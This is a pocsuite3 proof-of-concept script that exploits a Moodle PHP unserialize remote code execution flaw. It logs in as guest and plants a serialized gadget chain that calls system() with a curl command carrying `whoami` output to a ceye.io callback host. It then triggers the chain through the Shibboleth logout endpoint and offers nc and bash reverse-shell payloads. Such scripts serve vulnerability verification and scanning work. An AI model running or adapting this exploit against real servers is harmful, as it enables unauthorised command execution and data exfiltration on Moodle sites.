
import base64
import binascii
from collections import OrderedDict
from urllib.parse import urljoin

from requests.exceptions import ReadTimeout

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, \
    OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text
import re


class DemoPOC(POCBase):
    vulID = '97343'  # ssvid
    version = '3.0'
    author = ['seebug']
    vulDate = '2018-06-14'
    createDate = '2018-06-14'
    updateDate = '2018-06-14'
    references = ['https://www.seebug.org/vuldb/ssvid-97343']
    name = 'moodle unserialize rce'
    appPowerLink = ''
    appName = 'moodle'
    appVersion = '3.11 3.10 3.9'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''3.11, 3.10 to 3.10.4, 3.9 to 3.9.7 and earlier unsupported versions'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    protocol = POC_CATEGORY.PROTOCOL.HTTP
    pocDesc = ''''''

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description='攻击时自定义命令')
        o["app_version"] = OptItems(['2.x', '3.x', 'Auto'], selected="Auto", description='目标版本，可自动匹配')
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["payload"] = OptDict(default=payload, selected="bash")
        return o

    def _verify(self):
        result = {}
        ceye_token = "xxxxd02bb2a9461b6b8d201"
        ceye_rawurl = "xxxxxx.ceye.io"
        flag = self.url.replace("http://","").replace("https://","").replace(":","").replace("/","").replace("-","")
        if len(flag) > 20:
            flag = flag[:20]
        else:
            length = 20 - len(flag)
            flag += length*'a'
        try:
            r = requests.session()
            login_url = urljoin(self.url, "/login/index.php")
            html = r.get(login_url).text
            logintoken = re.findall('<input type="hidden" name="logintoken" value="(.*?)">', html)[0]
            data1 = {
                "logintoken": logintoken,
                "username": "guest",
                "password": "guest"
            }
            r.post(login_url, data=data1)
            data2 = {
                "id": 1,
                "sifirst": 'Testaaaaa|a:2:{i:0;O:22:"core_question_external":0:{}i:1;O:14:"core\lock\lock":1:{s:3:"key";O:22:"core_availability\\tree":1:{s:8:"children";O:23:"core\dml\\recordset_walk":3:{s:9:"recordset";O:25:"question_attempt_iterator":2:{s:5:"slots";a:1:{s:3:"xxx";s:3:"key";}s:4:"quba";O:26:"question_usage_by_activity":1:{s:16:"questionattempts";a:1:{s:3:"key";s:56:"curl http://aaaaaaaaaaaaaaaaaaaa.'.replace("aaaaaaaaaaaaaaaaaaaa",flag) + ceye_rawurl + '/`whoami`";}}}s:13:"callbackextra";N;s:8:"callback";s:6:"system";}}}}Testbbbbbb|'
            }
            data3 = '''<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body>
            <LogoutNotification><SessionID>ssss</SessionID>
            </LogoutNotification></s:Body></s:Envelope>'''

        
            write_url = urljoin(self.url, '/grade/report/grader/index.php')
            r.post(write_url, data=data2)
            rce_url = urljoin(self.url, "/auth/shibboleth/logout.php")
            requests.post(rce_url, data=data3)
            ceye_url = "http://api.ceye.io/v1/records?token=" + ceye_token + "&type=http&filter=" + flag
            rsp = requests.get(ceye_url, timeout=30).json()
            if len(rsp["data"]) > 0:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()

register_poc(DemoPOC)



